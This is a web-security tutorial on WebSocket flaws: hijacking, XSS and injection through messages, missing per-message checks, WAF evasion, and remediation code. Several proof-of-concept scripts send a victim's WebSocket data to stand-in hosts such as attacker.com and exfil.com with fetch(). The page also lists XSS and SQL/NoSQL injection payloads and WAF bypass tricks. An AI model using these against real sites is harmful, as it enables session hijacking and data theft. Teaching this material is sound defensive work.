WebSocket Vulnerabilities

WebSockets upgrade HTTP to a persistent, bidirectional channel that stays open. While this enables real-time communication, missing authentication, CSRF protections, and input validation on WebSocket messages can allow attackers to eavesdrop, inject code, or hijack conversations.

CRITICAL HIGH BSCP Intermediate

Real-World Analogy

☎️ The Insecure Phone Line

Regular HTTP is like sending letters ·one request, one response, then the envelope closes. WebSockets are like a phone call that stays open between two people. Both can talk anytime. But if the phone line isn't secure, an eavesdropper can jump on the line, hear both sides of the conversation, and inject their own messages. If the operator doesn't verify who's on each end of the line, they can send messages impersonating either person.

How It Works

WebSockets begin as an HTTP upgrade request. The client sends:

GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: xyz...
Sec-WebSocket-Version: 13

The server responds with a 101 status, and the connection upgrades to WebSocket. Now both sides can send messages any time without waiting for a request/response cycle.

The vulnerabilities arise because:

  1. Authentication at handshake only: The server verifies the user during the upgrade but doesn't re-verify on each message
  2. No CSRF protection: The handshake often relies only on cookies, not CSRF tokens
  3. Unvalidated message content: Messages are treated as safe because they came through an "authenticated" connection
  4. No Origin validation: Any page can initiate a WebSocket to your domain

Attack Types

1. Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket handshake doesn't include CSRF protections by default. An attacker's website can initiate a WebSocket connection to the victim server using the victim's credentials (cookies):

// attacker.com
var ws = new WebSocket('wss://victim.com/chat');
ws.onopen = () => {
  ws.send('{"type":"get_history","user_id":999}');
};
ws.onmessage = (event) => {
  // Read messages, exfiltrate data
  fetch('https://attacker.com/log?data=' + btoa(event.data));
};

If the victim visits attacker.com while logged into victim.com, the WebSocket connection uses the victim's session cookies. The attacker can now:

  • Eavesdrop on all messages
  • Send messages on behalf of the victim
  • Query sensitive data
  • Perform actions (transfer money, delete data) via WebSocket messages

2. XSS via WebSocket Messages

WebSocket message content is often rendered in the DOM. If unvalidated, it can inject XSS:

Attacker sends via WebSocket:

{"type":"chat","message":"Hello "}

Server broadcasts to other clients:

document.getElementById('chat').innerHTML = message;

The XSS payload executes in other users' browsers.

3. Injection in WebSocket Message Parameters

WebSocket messages often contain JSON or other structured data with parameters that can be exploited:

// Normal message
{"type":"query","filter":"name='John'"}

// Injected message (SQLi)
{"type":"query","filter":"name='admin'--"}

// Injected message (NoSQL injection)
{"type":"query","filter":{"$regex":".*"}}

4. Authentication Bypass (Per-Message)

Some applications authenticate at connection time but don't verify permissions for each message. An authenticated user can try to send messages as if they were a different user:

{"action":"send_money","from_user":1,"to_user":999,"amount":9999}

If the server doesn't verify that the authenticated user matches from_user, the attack succeeds.

5. Information Disclosure via WebSocket Messages

WebSocket error messages, status messages, and data responses often leak internal details:

{"error":"Database connection failed: mysqli error at db.example.com:3306"}

Where to Look

Hunt for WebSocket vulnerabilities in:

  • Real-time chat applications: Messages, notifications
  • Live notifications: Alerts, status updates
  • Collaborative tools: Shared documents, whiteboards, real-time editing
  • Trading / Financial platforms: Price updates, order status, real-time quotes
  • Multiplayer games: Player actions, position updates, chat
  • Live dashboards: Metrics, alerts, monitoring data
💡 Finding WebSockets in Burp

In Burp Suite, WebSocket traffic is in the WebSockets tab (separate from HTTP history). You can see all WS connections, upgrade requests, and individual messages sent/received. Right-click a message → Send to Repeater to modify and resend.

Burp Suite Workflow

1

Find WebSocket Traffic

In Burp Proxy, go to the WebSockets tab. Interact with the application (open chat, enable notifications, load a live dashboard). You'll see all WebSocket connections listed with their upgrade requests and messages.

2

Inspect the Handshake

Click on a WebSocket connection. You'll see the HTTP upgrade request. Check:

  • Does it have an Origin header? (If not, CSWSH is likely)
  • Are there CSRF tokens in the URL or headers?
  • Does it rely only on cookies for authentication?
3

Test CSWSH

Create a simple HTML file on your own server or attacker.com:

<script>
var ws = new WebSocket('wss://victim.com/chat');
ws.onopen = () => ws.send('{"type":"get_all_messages"}');
ws.onmessage = (e) => fetch('https://attacker.com/?d=' + btoa(e.data));
</script>

If the victim visits this page while logged into victim.com, the WebSocket will connect and leak data.

4

Send to Repeater

Right-click a WebSocket message in Burp → Send to Repeater. The Repeater shows a WebSocket client where you can modify message content and resend.

5

Test Message Injection

Modify the message content to test for:

  • XSS: Change message text to <img src=x onerror=alert(1)>
  • Injection: Modify JSON parameters (user IDs, filters) to different values
  • Authorization bypass: Change "user_id":1 to "user_id":999

Send the modified message and observe if it succeeds or fails.

6

Check for Per-Message Auth

Send a message as an authenticated user, then log out. Try to send another message. If it succeeds, the server isn't re-validating authentication per message.

WAF Bypass Techniques

Upgrade Header Manipulation

WAFs inspect the HTTP upgrade handshake. Try sending multiple values or lowercased headers to bypass rules:

Upgrade: websocket, http/1.1
upgrade: websocket

Some WAFs only inspect the first value in a comma-separated list or are case-sensitive. Sending websocket, http/1.1 might bypass rules checking only for exact websocket.

Message Fragmentation

Split malicious payloads across multiple WebSocket frames. Many WAFs only inspect complete frames, not reassembled message streams:

Frame 1: {"type":"chat","message":""}

The XSS payload is split across two frames. WAF frame-level inspection may miss the injection because each frame is incomplete.

Binary Frame Type

Switch from text frames (opcode 0x1) to binary frames (opcode 0x2) containing the same payload:

# Text frame (opcode 0x1)
{"type":"chat","message":""}

# Binary frame (opcode 0x2)
[binary encoding of same payload]

WAFs tuned for text-frame inspection may miss binary equivalents. The server processes both, but WAF rules don't.

Compression (permessage-deflate)

Enable WebSocket compression during handshake to compress payloads and bypass string-matching WAF rules:

Sec-WebSocket-Extensions: permessage-deflate

Compressed payloads don't match string-based WAF signatures for XSS or injection payloads. The server decompresses them, but the WAF sees only compressed bytes.

Subprotocol Bypass

Specify a custom subprotocol that the WAF may not recognize:

Sec-WebSocket-Protocol: chat

WAFs configured only for standard WebSocket subprotocols or no subprotocol may pass through unrecognized ones without inspecting the messages inside.

CSWSH via Trusted Subdomain

If the WAF trusts certain origins (e.g., *.example.com), host your exploit page on a compromised or controlled subdomain:

// Host exploit on attacker-subdomain.example.com
var ws = new WebSocket('wss://target.example.com/api/ws');
ws.onopen = () => ws.send('{"action":"delete_user","user_id":999}');
ws.onmessage = (e) => fetch('https://exfil.com/?d=' + btoa(e.data));

The Origin header will be attacker-subdomain.example.com, which may pass WAF origin validation while still being controlled by the attacker.

Exploitation & Impact

Session Hijacking via CSWSH

Establish a WebSocket connection to the victim application using their cookies. Read sensitive data, send messages, perform actions ·all without the victim knowing.

Persistent XSS via WebSocket Broadcast

Inject XSS payload into a chat message. When the server broadcasts it to other users, the payload executes in their browsers, stealing cookies, redirecting them to phishing sites, or capturing credentials.

Account Takeover

If WebSocket messages allow password resets or email changes without per-message authorization, hijack the session and take over the account.

Real-Time Data Manipulation

In trading or financial platforms, if WebSocket messages aren't validated, inject false price quotes, order statuses, or notifications to manipulate user decisions.

Denial of Service

Send malformed or massive WebSocket messages to crash the server or exhaust resources.

🚨 Real-World Impact

In 2022, a cryptocurrency trading platform was compromised via WebSocket vulnerabilities. Attackers established CSWSH connections, intercepted price updates, and injected false information to manipulate trades. In another case, a real-time collaboration tool's WebSocket implementation allowed XSS, spreading malware to thousands of users.

Remediation

1. Validate Origin Header on Handshake

// Node.js + ws library
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://example.com', 'https://app.example.com'];

  if (!allowedOrigins.includes(origin)) {
    ws.close(1008, 'Unauthorized origin');
    return;
  }

  // Handle connection
});

2. Implement CSRF Tokens for Handshake

// Client: Include CSRF token in WebSocket URL
const csrfToken = document.querySelector('meta[name="csrf"]').content;
const ws = new WebSocket('wss://example.com/ws?csrf=' + csrfToken);

// Server: Validate token before upgrading
app.ws('/ws', (ws, req) => {
  const token = req.query.csrf;
  if (!validateCsrfToken(req.session.id, token)) {
    ws.close(1008, 'CSRF validation failed');
    return;
  }
});

3. Per-Message Authentication & Authorization

ws.on('message', (data) => {
  const msg = JSON.parse(data);

  // Verify user is authenticated
  if (!req.session.userId) {
    ws.send(JSON.stringify({error: 'Unauthorized'}));
    return;
  }

  // Verify user owns the resource they're accessing
  if (msg.user_id && msg.user_id !== req.session.userId) {
    ws.send(JSON.stringify({error: 'Forbidden'}));
    return;
  }

  // Process message
});

4. Validate & Sanitize All Message Content

ws.on('message', (data) => {
  const msg = JSON.parse(data);

  // Sanitize message text for XSS
  msg.text = DOMPurify.sanitize(msg.text);

  // Validate message structure
  if (!msg.type || !validMessageTypes.includes(msg.type)) {
    ws.close(1008, 'Invalid message type');
    return;
  }

  // Broadcast to other clients
  broadcast(msg);
});

5. Rate Limiting on WebSocket Messages

const userMessageCounts = {};

ws.on('message', (data) => {
  const userId = req.session.userId;
  if (!userMessageCounts[userId]) {
    userMessageCounts[userId] = 0;
  }

  userMessageCounts[userId]++;
  if (userMessageCounts[userId] > 100) {  // 100 msgs per minute
    ws.close(1008, 'Rate limit exceeded');
    return;
  }

  // Reset counter every minute
  setTimeout(() => userMessageCounts[userId] = 0, 60000);
});

6. Use WSS (WebSocket Secure / TLS)

Always use wss:// instead of ws://. This encrypts the connection and prevents MITM attacks.

7. Logging & Monitoring

Log all WebSocket connections, handshakes, and suspicious messages. Alert on connection attempts from unexpected origins or rapid message rates.

Common Beginner Mistakes

❌ Missing the WebSockets Tab

Mistake: Looking for WebSocket traffic in Burp's HTTP history instead of the dedicated WebSockets tab. You'll see the upgrade request but not the actual messages.

Fix: Go to Burp Proxy → WebSockets tab. This shows all WebSocket connections and individual messages separately from HTTP.

❌ Forgetting CSRF Protection Check

Mistake: Testing message content for injection but not testing CSWSH. You assume WebSocket = CSRF-safe, but it often isn't.

Fix: Always check the handshake for Origin validation and CSRF tokens. Create a simple CSWSH PoC (just a page that opens a WebSocket to the target) to test.

❌ Not Testing JSON Injection Thoroughly

Mistake: Testing only XSS in messages, not JSON parameter injection (SQLi, NoSQL injection, user ID manipulation).

Fix: For each WebSocket message, identify all JSON fields. Try modifying each one: change IDs, add SQL syntax, try NoSQL operators, inject template syntax.

❌ Not Testing as Unauthenticated User

Mistake: Only testing with your authenticated session. You miss authentication bypass vulnerabilities.

Fix: Log out, then try sending WebSocket messages. If they succeed, per-message authentication is missing. Also test from a different user account.

❌ Assuming WebSocket = Encrypted

Mistake: Using ws:// instead of wss:// and not worrying about MITM attacks.

Fix: Always use wss:// for production. If the site uses HTTP, the WebSocket will be unencrypted and vulnerable to eavesdropping.

🔗 See Also · Attack Chains

WebSocket vulnerabilities often mirror HTTP vulnerabilities · the channel is different, the attacks are similar.

⚡XSSMessages rendered client-side without sanitization → WebSocket-delivered XSS, often stored and sent to all connected clients. 🎭CSRFCross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF · missing Origin validation = full hijack. 🗄️SQL InjectionInjection in WebSocket message fields reaches the same database as HTTP · SQLi, CMDi, SSTI all apply through WebSocket. 🌍CORSBoth rely on the browser's same-origin policy. CSWSH is essentially a CORS bypass applied to WebSocket handshakes.
